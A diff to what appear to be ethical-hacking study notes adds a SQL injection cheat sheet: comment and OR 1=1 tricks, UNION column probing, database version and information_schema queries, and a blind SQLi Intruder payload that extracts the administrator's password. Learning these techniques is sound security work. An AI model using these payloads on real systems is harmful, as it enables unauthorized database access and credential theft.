@@ -189,6 +189,49 @@
   ````
 
 #### Web explotation
+##### SQL Injection  
+
+<details><summary>Detect and Retrieving</summary>
+  
+- note that `-- ` is a comment indicator in mySQL or `--` `#` in oracle/MS/Pgres. This `'--` means that the rest of the query is interpreted as a comment, effectively removing it.  
+- `condition'+OR+1=1--` in which, other then condition we input 1 is equal to 1. As 1=1 is always true, the query returns all items.   
+- `' ORDER BY 1--` `' ORDER BY 2--`...until error or `' UNION SELECT NULL--` `' UNION SELECT NULL,NULL--` ...,is to get number of columns  
+- [here more detailed comparison on queries of databases types](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+</details>
+<details><summary>to determine the database version for some popular database types:</summary>
+  
+Microsoft, MySQL 	`SELECT @@version`  
+Oracle 	`SELECT * FROM v$version`  
+PostgreSQL 	`SELECT version()`  
+
+For example, you could use a UNION attack with the following input:  
+````sql
+  ' UNION SELECT @@version--
+````
+
+</details>
+<details><summary>Listing the contents of the database(except Oracle)</summary>
+
+you can query information_schema.tables to list the tables in the database: 
+````sql
+  SELECT * FROM information_schema.tables
+````
+You can then query information_schema.columns to list the columns in individual tables:
+````sql
+  SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+````
+
+</details>
+
+<details><summary>Blind SQLi</summary>
+
+In Cookies, If suppose we found users' as a table and administrator' as a username with multiple boolean conditions with burp repeater, then with intruder we can cluster bomb:  
+````sql
+  vz9' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§;
+````
+</details>
+
+
 [SQLmap cheetsheet](https://github.com/LibyKurian/ethicalhacking-h/blob/main/sqlmap_cheatsheet.md) 🔗
 ````js
 // sql injection
